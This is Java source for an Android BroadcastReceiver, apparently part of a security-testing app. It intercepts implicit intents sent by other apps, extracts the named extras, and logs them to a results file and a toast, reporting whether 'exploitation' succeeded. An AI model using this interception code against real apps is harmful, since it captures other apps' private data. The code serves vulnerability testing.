package com.example.ask.ui.implicitIntent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

import com.example.ask.util.FileUtil;
import com.example.ask.util.ResourceUtil;

import static com.example.ask.broadcast.AskBroadcastReceiver.category_id;

public class HijackingImplicitIntentReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {

        FileUtil.saveResultToFile("成功劫持隐式intent。", context);
        category_id = "implicit_intent_4";
        String name = category_id + "_extras";
        String[] extras = ResourceUtil.getStringArrayByName(context, name);
        FileUtil.saveResultToFile("开始解析intent中的数据........", context);
        if (extras == null) {
            FileUtil.saveResultToFile("所劫持的intent中无数据。", context);
            FileUtil.saveResultToFile("利用失败。", context);
            Toast.makeText(context, "成功劫持隐式intent。\n" +
                    "所劫持的intent中无数据。\n 利用失败。", Toast.LENGTH_LONG).show();
        } else {
            FileUtil.saveResultToFile("intent数据解析如下：", context);
            Bundle bundle = intent.getExtras();
            String info = "成功劫持隐式intent。\n intent数据解析如下：\n";
            for (String extra_key : extras) {
                String value = bundle.getString(extra_key);
                info = info + extra_key + ":   " + value.toString() + "\n";
                FileUtil.saveResultToFile(extra_key + ":   " + value.toString(), context);
            }
            info = info + "利用成功";
            FileUtil.saveResultToFile("利用成功。", context);
            Toast.makeText(context, info, Toast.LENGTH_LONG).show();
        }
    }
}
